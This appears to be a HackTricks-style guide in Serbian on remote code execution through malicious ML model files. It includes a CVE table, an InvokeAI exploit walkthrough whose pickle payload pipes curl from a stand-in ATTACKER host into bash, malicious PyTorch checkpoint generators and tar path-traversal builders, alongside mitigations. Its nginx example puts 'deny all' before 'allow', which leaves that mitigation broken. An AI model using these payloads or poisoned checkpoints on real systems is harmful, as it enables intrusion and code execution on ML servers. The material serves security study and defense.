# Modeli RCE

{{#include ../banners/hacktricks-training.md}}

## Učitavanje modela za RCE

Machine Learning modeli se obično dijele u različitim formatima, poput ONNX, TensorFlow, PyTorch, itd. Ti modeli mogu biti učitani na developerske mašine ili proizvodne sisteme radi upotrebe. Obično modeli ne bi trebalo da sadrže maliciozan kod, ali postoje slučajevi gde model može biti iskorišćen da izvrši arbitrarni kod na sistemu kao nameravana funkcionalnost ili zbog ranjivosti u biblioteci za učitavanje modela.

U vreme pisanja, ovo su neki primeri ovog tipa ranjivosti:

| **Framework / Alat**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

Pored toga, postoje neki python pickle-based modeli kao oni koji se koriste u [PyTorch](https://github.com/pytorch/pytorch/security) koji mogu biti iskorišćeni za izvršavanje arbitrarog koda na sistemu ako nisu učitani sa `weights_only=True`. Dakle, bilo koji pickle-based model može biti posebno podložan ovom tipu napada, čak i ako nije naveden u tabeli iznad.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` je popularan open-source web interfejs za Stable-Diffusion. Verzije **5.3.1 – 5.4.2** izlažu REST endpoint `/api/v2/models/install` koji dozvoljava korisnicima preuzimanje i učitavanje modela sa proizvoljnih URL-ova.

Interno, endpoint na kraju poziva:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Ako je dostavljeni fajl **PyTorch checkpoint (`*.ckpt`)**, `torch.load` izvršava **pickle deserialization**. Pošto sadržaj dolazi direktno sa URL-a kojim korisnik upravlja, napadač može u checkpoint ubaciti maliciozni objekat sa prilagođenom `__reduce__` metodom; ta metoda se izvršava **during deserialization**, što dovodi do **remote code execution (RCE)** na InvokeAI serveru.

Ranljivost je dodeljena **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Koraci eksploatacije

1. Napravite maliciozni checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hostujte `payload.ckpt` na HTTP serveru koji kontrolišete (npr. `http://ATTACKER/payload.ckpt`).
3. Pokrenite ranjiv endpoint (autentifikacija nije potrebna):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Kada InvokeAI preuzme fajl, pozove `torch.load()` → `os.system` gadget se pokreće i napadač dobija izvršavanje koda u kontekstu InvokeAI procesa.

Gotov exploit: **Metasploit** modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizuje ceo tok.

#### Uslovi

•  InvokeAI 5.3.1-5.4.2 (scan flag podrazumevano **false**)  
•  `/api/v2/models/install` dostupan napadaču  
•  Proces ima dozvole za izvršavanje shell komandi

#### Mitigacije

* Ažurirajte na **InvokeAI ≥ 5.4.3** – zakrpa postavlja `scan=True` po defaultu i izvršava skeniranje za malver pre deserializacije.  
* Prilikom programskog učitavanja checkpoint-ova koristite `torch.load(file, weights_only=True)` ili novi [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Primeni allow-lists / potpise za izvore modela i pokreni servis sa najmanjim potrebnim privilegijama.

> ⚠️ Zapamtite da je **bilo koji** Python pickle-baziran format (uključujući mnoge `.pt`, `.pkl`, `.ckpt`, `.pth` fajlove) suštinski nesiguran za deserializaciju iz nepouzdanih izvora.

---

Primer ad-hoc mitigacije ako morate zadržati starije InvokeAI verzije koje rade iza reverse proxy-ja:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE zbog nesigurnog `torch.load` (CVE-2025-23298)

NVIDIA-ina Transformers4Rec (deo Merlina) izložila je nesiguran loader checkpoint-a koji je direktno pozivao `torch.load()` na putanjama koje je obezbedio korisnik. Pošto `torch.load` zavisi od Python `pickle`, checkpoint pod kontrolom napadača može da izvrši proizvoljan kod preko reducera tokom deserializacije.

Ranjiv put (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Zašto ovo dovodi do RCE: U Python `pickle`, objekat može da definiše reducer (`__reduce__`/`__setstate__`) koji vraća callable i argumente. Taj callable se izvršava tokom deserializacije. Ako se takav objekat nalazi u checkpoint-u, on se izvršava pre nego što se koriste bilo koje težine.

Minimalni maliciozni checkpoint primer:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vektori isporuke i razmera uticaja:
- Trojanizovani checkpoints/modeli deljeni putem repos, buckets ili artifact registries
- Automatizovani resume/deploy pipelines koji automatski učitavaju checkpoints
- Izvršavanje se dešava unutar training/inference workers, često sa povišenim privilegijama (npr. root u containerima)

Ispravka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zamenio je direktno `torch.load()` ograničenim, allow-listed deserializer-om implementiranim u `transformers4rec/utils/serialization.py`. Novi loader validira tipove/polja i sprečava da se proizvoljni callables pozivaju tokom učitavanja.

Preporuke za odbranu specifične za PyTorch checkpoints:
- Ne unpickle-ujte nepouzdane podatke. Preferirajte neizvršne formate kao što su [Safetensors](https://huggingface.co/docs/safetensors/index) ili ONNX kad je to moguće.
- Ako morate koristiti PyTorch serialization, obezbedite `weights_only=True` (podržano u novijim PyTorch verzijama) ili koristite prilagođeni allow-listed unpickler sličan Transformers4Rec patchu.
- Obezbedite model provenance/signatures i sandbox deserializaciju (seccomp/AppArmor; non-root user; ograničen FS i bez network egress).
- Pratite neočekivane child procese iz ML servisa tokom učitavanja checkpoint-a; trace-ujte `torch.load()`/`pickle` korišćenje.

POC i reference na ranjivosti/patch:
- Ranjiv pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Maliciozni checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Primer – kreiranje malicioznog PyTorch modela

- Napravite model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Učitaj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modeli za Path Traversal

Kao što je navedeno u [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), većina formata modela koje koriste različiti AI framework-ovi zasnovana je na arhivama, obično `.zip`. Stoga je moguće zloupotrebiti ove formate da se izvrše path traversal attacks, što omogućava čitanje proizvoljnih fajlova sa sistema na kojem se model učitava.

Na primer, sledećim kodom možete napraviti model koji će, pri učitavanju, kreirati fajl u direktorijumu `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ili, pomoću sledećeg koda možete kreirati model koji će prilikom učitavanja napraviti symlink ka direktorijumu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Detaljna analiza: Keras .keras deserialization and gadget hunting

Za fokusiran vodič o .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, and post-fix gadget discovery inside the allowlist, see:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Izvori

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
